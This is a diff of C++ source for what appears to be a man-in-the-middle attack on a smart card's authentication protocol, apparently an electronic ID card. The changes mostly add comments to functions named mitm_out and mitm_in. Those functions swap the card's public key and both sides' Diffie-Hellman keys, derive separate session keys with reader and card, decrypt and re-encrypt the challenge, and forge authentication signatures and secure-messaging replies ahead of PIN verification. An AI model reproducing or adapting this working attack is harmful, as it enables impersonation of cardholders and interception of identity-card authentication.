@@ -41,6 +41,7 @@ typedef enum {
   VERIFYPIN,
   END
 } STAGE;
+
 STAGE stage = START;
 CASNParser parser;
 CSHA256 sha256;
@@ -268,8 +269,8 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 		}
 		break;
 	case DH_KEY_EXCHANGE:
-		// TODO fix this
 		if (memcmp(curr_apdu, MSE_SET1, 4) == 0) {
+			//creating dh private/public key for mitm
 			do {
 				dh_prKey_mitm.resize(dh_q.size());
 				dh_prKey_mitm.random();
@@ -286,12 +287,16 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 			dh_pubKey_mitm = rsa.RSA_PURE(dhg);
 			dh_pubKey_mitmBytes = dh_pubKey_mitm.data();
 			
+			// saving dh pub key of the IFD
 			memcpy(dh_IFDpubKeyBytes, apdu+15, apduSize-15);
-			// copy in apdu+15 from dh_pubKey_mitmBytes apduSize-15 bytes
+
+			// sendind to the ICC the dh pub key of the mitm
 			memcpy(apdu+15, dh_pubKey_mitmBytes, apduSize-15);
 		}else if (memcmp(curr_apdu, MSE_SET2, 4) == 0) {
+			// doing same thing as before but since the key is big
+			// the operation is splitted in two apdus
 			memcpy(dh_IFDpubKeyBytes+245, apdu+5, 11);
-			// copy in apdu+5 from dh_pubKey_mitmBytes+245 11 bytes
+
 			memcpy(apdu+5, dh_pubKey_mitmBytes+245, 11);
 	
 		}
@@ -397,6 +402,7 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 			LOG_DEBUG("apdu modified:");
 			LOG_BUFFER(smApdu.data(), smApdu.size());
 		} else if (memcmp(apdu, ExtAuth1, 4) == 0) {
+			// crafting ext auth message
 			ByteDynArray toHash, toSign;
 			size_t padSize = 222;
 			ByteDynArray PRND(padSize);
@@ -409,7 +415,8 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 		
 			ByteDynArray signResp = certKey.RSA_PURE(toSign);
 			chResponse.set(&snIFDBa, &signResp);
-
+			
+			// crafting SM apdu
 			BYTE supp[231];
 			memcpy(supp,chResponse.data(),231);
 			ByteArray data = VarToByteArray(supp);
@@ -516,22 +523,23 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 	case READ_DAPP_PUBKEY:
 		LOG_DEBUG("READ_DAPP_PUBKEY");
 		if (memcmp(curr_apdu, adpu_PubKey1, 5) == 0) {
-			// substitute from 9 for respSize-11
-			// with the first respSize-8 bytes of defModule
+			// sunstitute in the response the crafted pub key of the mitm
+			// used for internal auth
 			memcpy(resp+9, defModule, (*respSize)-11);
 		}else if (memcmp(curr_apdu, adpu_PubKey2, 5) == 0) {
-			// substitute from 0 for respSize-2
-			// with respSize-2 bytes of defModule+119
+			// same as before but since the pub key is big
+			// the operation is splitted in multiple apdus
 			memcpy(resp, defModule+119, (*respSize)-2);
 		}else if (memcmp(curr_apdu, adpu_PubKey3, 5) == 0) {
-			// substitute from 0 for 9
-			// with 9 bytes of defModule+247
+			// same as before but since the pub key is big
+			// the operation is splitted in multiple apdus
 			memcpy(resp, defModule+247, 9);
 			stage = INIT_DH_PARAM;
 		}
 		break;
 	case INIT_DH_PARAM:
 		LOG_DEBUG("INIT_DH_PARAM");
+		// simply saving the dh parameters returned by the ICC
 		if (memcmp(curr_apdu, apdu_getDHDuopData_g, 17) == 0) {
 			memcpy(dh_gBytes, resp+18, (*respSize)-20);
 		}
@@ -564,31 +572,23 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 		break;
 	case DH_KEY_EXCHANGE:
 		LOG_DEBUG("DH_KEY_EXCHANGE");
-		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {
-			//do {
-			//	dh_ICCprKey_mitm.resize(dh_q.size());
-			//	dh_ICCprKey_mitm.random();
-			//} while (dh_q[0] < dh_ICCprKey_mitm[0]);
-			//dh_ICCprKey_mitm.right(1)[0] |= 1;
-			//ByteDynArray dhg(dh_g.size());
-			//dhg.fill(0);
-			//dhg.rightcopy(dh_g);
-			//CRSA rsa(dh_p, dh_ICCprKey_mitm);
-			//
-			//dh_ICCpubKey_mitm = rsa.RSA_PURE(dhg);
-			//dh_ICCpubKey_mitmBytes = dh_ICCpubKey_mitm.data();
-			
+		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {	
+			// saving the dh pub key of the ICC		
 			memcpy(dh_ICCpubKeyBytes, resp+8, 248);
-			//
+			// sendind to the IFD the dh pub key of the mitm
 			memcpy(resp+8, dh_pubKey_mitmBytes, 248);
 		} else if (memcmp(curr_apdu, apdu_GET_DATA_Data2, 5) == 0) {
+			// same as before but because the pub key is big
+			// the operation is done with multiple apdus
 			memcpy(dh_ICCpubKeyBytes+248, resp, 8);
-			//
+			
 			memcpy(resp, dh_pubKey_mitmBytes+248, 8);
 			
 			dh_ICCpubKey = VarToByteDynArray(dh_ICCpubKeyBytes);
 			dh_IFDpubKey = VarToByteDynArray(dh_IFDpubKeyBytes);
 
+			// form now the mitm has all the data to create the sessione key 
+			// both with the IFD and the ICC 
 			CRSA rsa(dh_p, dh_prKey_mitm);
 			ByteDynArray secretIFD = rsa.RSA_PURE(dh_IFDpubKey);
 			sessENC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffENC))).left(16);
@@ -616,27 +616,34 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 	case DAPP:
 			if (memcmp(curr_apdu, GetChallenge, 4) == 0) {
 				
+				// dec decipher using session key of the mitm with the ICC
 				ByteDynArray iv(8);
 				iv.fill(0);
 				CDES3 encDes_ICC(sessENC_ICC, iv);
 				BYTE tmp[16] = {};
-				memcpy(tmp, resp+3, 16);
 				
+				// saving the encrypted challenge
+				memcpy(tmp, resp+3, 16);
 				ByteArray encData;
 				encData = VarToByteArray(tmp);
 				LOG_DEBUG("encData:");
 				LOG_BUFFER(encData.data(), encData.size());
+				// decrypting the challenge
 				challenge = encDes_ICC.RawDecode(encData);
 				challenge.resize(RemoveISOPad(challenge),true);
 				LOG_DEBUG("Challenge:");
 				LOG_BUFFER(challenge.data(), challenge.size());
-				//crafting the response
+
+				// crafting the response
 				increment(sessSSC_ICC);
 				increment(sessSSC_IFD);
 				CDES3 encDes_IFD(sessENC_IFD, iv);
 				CMAC sigMac_IFD(sessMAC_IFD, iv);
 				ByteDynArray encChallenge;
+				// encrypt che challenge using the session key of the mitm with the IFD
 				encChallenge = encDes_IFD.RawEncode(ISOPad(challenge));
+
+				// crafting the SM response
 				ByteDynArray datafield;
 				uint8_t Val01 = 1;
 				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encChallenge));
@@ -654,6 +661,7 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 				respBa.set(&data, &ccfb, &swBa);
 				memcpy(resp, respBa.data(), *respSize);
 			} else if (memcmp(curr_apdu, GiveRandom, 4) == 0) {
+				// crafting the int auth payload
 				CRSA intAuthKey(module, privexp);
 				PRND2.random();
 				toHashIFD.set(&PRND2, &dh_pubKey_mitm, &sn_iccBa, &rndIFD, &dh_IFDpubKey, &dh_g, &dh_p, &dh_q);
@@ -667,7 +675,7 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 				SIG = intAuthKey.RSA_PURE(respBa);
 				intAuthresp.set(&sn_iccBa, &SIG);
 
-				//crafting the response
+				//crafting the SM response
 				ByteDynArray iv(8);
 				iv.fill(0);
 				increment(sessSSC_ICC);
@@ -698,6 +706,8 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 				stage = VERIFYPIN;
 				ByteArray challengeBa = challenge.right(4);
     			ByteArray rndIFDBa = rndIFD.right(4);
+				
+				
 				sessSSC_ICC.set(&challengeBa, &rndIFDBa);
 				sessSSC_IFD.set(&challengeBa, &rndIFDBa);
 			} else {
